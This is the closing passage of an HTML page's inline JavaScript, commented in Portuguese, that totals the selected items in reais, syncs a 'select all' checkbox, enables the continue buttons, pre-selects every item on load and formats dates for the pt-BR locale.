            });
            const totalValue = document.getElementById('totalValue');
            const resumoTotal = document.getElementById('resumoTotal');
            if (totalValue) {
                totalValue.innerHTML = 'R$&nbsp;' + total.toLocaleString('pt-BR', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                });
                totalValue.parentElement.style.display = '';
            }
            if (resumoTotal) {
                resumoTotal.innerHTML = 'R$&nbsp;' + total.toLocaleString('pt-BR', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                });
                resumoTotal.parentElement.style.display = '';
            }

            // Atualiza o checkbox Selecionar tudo
            const checkAll = document.getElementById('checkAll');
            if (checkAll) {
                if (checkedCount === checkboxes.length && checkboxes.length > 0) {
                    checkAll.checked = true;
                } else {
                    checkAll.checked = false;
                }
            }

            // Ativa/desativa botões de continuar
            const btns = [
                document.getElementById('btnContinuarTop'),
                document.getElementById('btnContinuar')
            ];
            btns.forEach(function(btn) {
                if (btn) {
                    if (checkedCount > 0) {
                        btn.disabled = false;
                        btn.classList.remove('is-disabled');
                        btn.setAttribute('aria-disabled', 'false');
                    } else {
                        btn.disabled = true;
                        btn.classList.add('is-disabled');
                        btn.setAttribute('aria-disabled', 'true');
                    }
                }
            });
        }

        // Adiciona evento nos checkboxes
        lista.addEventListener('change', function(e) {
            if (e.target && e.target.type === 'checkbox') {
                atualizarTotalSelecionado();
            }
        });

        // Selecionar todos
        const checkAll = document.getElementById('checkAll');
        if (checkAll) {
            checkAll.addEventListener('change', function() {
                const checkboxes = lista.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(cb => {
                    cb.checked = checkAll.checked;
                });
                atualizarTotalSelecionado();
            });
        }

        // Inicializa total como R$ 0,00 e visível, botões desativados
        const totalValue = document.getElementById('totalValue');
        if (totalValue) {
            totalValue.innerHTML = 'R$&nbsp;0,00';
            totalValue.parentElement.style.display = '';
        }
        const resumoTotal = document.getElementById('resumoTotal');
        if (resumoTotal) {
            resumoTotal.innerHTML = 'R$&nbsp;0,00';
            resumoTotal.parentElement.style.display = '';
        }
        // Função para marcar tudo automaticamente
        function marcarTudo() {
            const checkAll = document.getElementById('checkAll');
            if (checkAll) checkAll.checked = true;
            const checkboxes = lista.querySelectorAll('input[type="checkbox"]');
            checkboxes.forEach(cb => {
                cb.checked = true;
            });
            atualizarTotalSelecionado();
        }
        // Marca tudo ao carregar
        marcarTudo();
    }

    // Função para formatar data/hora
    function formatarData(dataIso) {
        if (!dataIso) return '';
        const d = new Date(dataIso);
        if (isNaN(d)) return '';
        return d.toLocaleDateString('pt-BR') + ' - ' + d.toLocaleTimeString('pt-BR', {
            hour: '2-digit',
            minute: '2-digit'
        });
    }
});
</script>

</html>